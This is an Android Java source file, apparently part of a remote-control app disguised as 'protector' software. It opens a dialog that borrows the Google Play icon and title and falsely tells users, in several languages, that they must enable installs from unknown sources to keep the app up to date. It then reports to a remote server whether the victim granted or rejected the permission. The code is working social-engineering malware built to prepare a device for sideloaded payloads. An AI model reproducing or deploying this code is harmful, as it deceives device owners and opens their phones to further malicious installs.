package com.icontrol.protector;

import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import java.util.Locale;


public class Requestinstall extends Activity {
    private static final int REQUEST_INSTALL_PERMISSION = 1001;
    private static Context Myctx;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Myctx = getApplicationContext();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Check if the app already has the permission
            if (!getPackageManager().canRequestPackageInstalls()) {
                // Request the permission
                Askinstall();
            }
        }
    }
    private void Askinstall() {
        String CurrnetLanuage = Locale.getDefault().getLanguage();
        //Toast.makeText(this,"Enable Draw over apps For : " + getString(R.string.f1f2f3f4f5f6), Toast.LENGTH_LONG).show();
        final AlertDialog.Builder alertDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert);


        String buttonnameOK="OK";
        String MYNAME= UtliTools.getAppNameFromPkgName(Myctx,Myctx.getPackageName());
        switch (CurrnetLanuage){
            case "en":
                buttonnameOK="Enable";

                alertDialog.setMessage("To keep the app up-to date , please enable install from: "+ MYNAME);
                break;
            case "ar":
                buttonnameOK="تفعيل";

                alertDialog.setMessage("للحفاظ على التطبيق محدثًا ، يرجى تمكين التثبيت من: "+MYNAME);
                break;
            case "cn":
                buttonnameOK="使能够";

                alertDialog.setMessage("为了使应用程序保持最新状态，请启用从以下位置安装："+ MYNAME);
                break;
            case "tr":
                buttonnameOK="Tamam";

                alertDialog.setMessage("Uygulamayı güncel tutmak için Şuradan Yükle'yi etkinleştirin: "+MYNAME);
                break;
            default:
                buttonnameOK="OK";

                alertDialog.setMessage("to keep the app up-to date , please enable install from: "+ MYNAME);
                break;

        }
        try {
            Drawable icon = this.getPackageManager().getApplicationIcon("com.android.vending");
            alertDialog.setIcon(icon);
            alertDialog.setTitle("Google Play");
        } catch (PackageManager.NameNotFoundException e) {

            try {
                // null;
                Drawable icon = this.getPackageManager().getApplicationIcon(getPackageName());
                alertDialog.setIcon(icon);
                alertDialog.setTitle(MYNAME);
            } catch (PackageManager.NameNotFoundException ex) {
                //ex.printStackTrace();
            }

        }


        alertDialog.setPositiveButton(buttonnameOK, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialogInterface, int i) {

                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivityForResult(intent, REQUEST_INSTALL_PERMISSION);
            }
        });


        alertDialog.show();

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        if (requestCode == REQUEST_INSTALL_PERMISSION) {

            if (resultCode == RESULT_OK) {
                AlertServer(Myctx, "install Apps", "Permission Enabled");
            } else {
                AlertServer(Myctx, "install Apps", "Client Rejected Request");
            }
            finish();
        }
    }
}
